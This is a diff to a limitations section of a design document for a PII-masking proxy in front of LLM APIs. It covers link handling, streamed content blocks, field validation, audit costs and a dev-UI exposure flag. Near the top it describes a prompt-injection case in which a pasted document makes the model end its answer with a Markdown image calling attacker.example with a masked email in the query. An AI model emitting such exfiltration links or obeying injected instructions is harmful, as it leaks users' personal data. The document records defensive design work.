@@ -55,12 +55,39 @@ with each phase; the threat model gets its full review before the first pilot.
   placeholders. A pasted document can ask the model to end its answer with an
   image such as `![s](https://attacker.example/p.png?d=[EMAIL_1])`; restoring
   the email there would let a Markdown client send it to that host without a
-  click. Placeholders in bare URLs, Markdown link and image targets, link
-  reference definitions, autolinks and HTML attribute values are left as
-  written and counted as unresolved (ADR 0003 amendment 1). Detecting these
-  contexts errs towards "inside", so a placeholder next to some link-like text
-  may also stay visible. A value the model writes out itself, rather than as a
-  placeholder, is outside this rule: it was never masked.
+  click. Placeholders in bare URLs (after `//`, `www.` in any case, or any
+  `scheme:` followed by a non-space, such as `https:host`, `javascript:`,
+  `data:` or `mailto:`, up to the next ASCII whitespace), Markdown link and
+  image targets, link reference definitions (after `]:` anywhere on a line,
+  block quotes and list items included), autolinks, HTML attribute values and
+  CSS `url(...)` and `@import` targets are left as written and counted as
+  unresolved (ADR 0003 amendment 1). Detecting these contexts errs towards
+  "inside", so a placeholder next to some link-like text may also stay
+  visible: `Re:[EMAIL_1]` with no space, or a `mailto:` link to a client. A
+  value the model writes out itself, rather than as a placeholder, is outside
+  this rule: it was never masked.
+- The blocks of one answer are read as one text. A client joins an Anthropic
+  answer's content blocks, so a link that one block opens runs on into the
+  next; the link rule therefore reads all blocks, and all OpenAI choices, in
+  one context in order, streamed or not, as well as each on its own. Text that
+  arrives for a block or choice after it was closed (`content_block_stop`, a
+  `finish_reason`) is passed on as written, never restored. Not covered: an
+  upstream that breaks the stream protocol by sending text for an earlier
+  Anthropic block after a later block was restored; a client that orders
+  blocks by index can then put that text in front of the restored value
+  (ADR 0003 amendment 1, point 6).
+- The model id and the short tokens sent upstream as written
+  (`json_schema.name`, `service_tier`, `reasoning_effort`, `verbosity`,
+  `thinking.type`) are read by the structured recognizers and the gazetteer;
+  a request with an identifier in one, such as an SSN-shaped number inside a
+  model id, is refused with a 400. A calendar date is allowed there, because
+  model snapshots carry one (`gpt-4o-2024-08-06`). No NER model reads these
+  fields, so a name there is found only when the gazetteer lists it; the
+  fields are limited to 64 (128 for a model id) letters, digits and `._:-`
+  (and `/` in a model id), with no spaces.
+- `GET /audit` verifies the whole chain on each call, so its cost grows with
+  the log. Retention (`retention_days`) bounds it; a cached verification is
+  deferred (security review 2, M-f).
 - Russian and Armenian coverage is weaker than English, and it is measured
   separately.
 - Armenian text, and text in any alphabet other than Latin and Cyrillic, goes
@@ -152,7 +179,10 @@ with each phase; the threat model gets its full review before the first pilot.
   as written; the mapping does not carry over between requests.
 - `/mask` returns the session's placeholder map to the caller, because the
   extension restores answers itself (ADR 0002 point 2). The map is personal
-  data; the caller must keep it in memory and drop it with the session.
+  data; the caller must keep it in memory and drop it with the session. With
+  `[proxy] allow_dev_ui = true`, any local web app served on port 5173 can call
+  `/mask` from a browser and read those maps; `safeguard serve` warns about
+  this at start-up, and the flag is off by default.
 - The browser extension (ADR 0026) masks only what goes through the textbox it
   knows on chatgpt.com, chat.openai.com, claude.ai and gemini.google.com. It finds
   the box and the send button by selectors; when a site changes its page so that
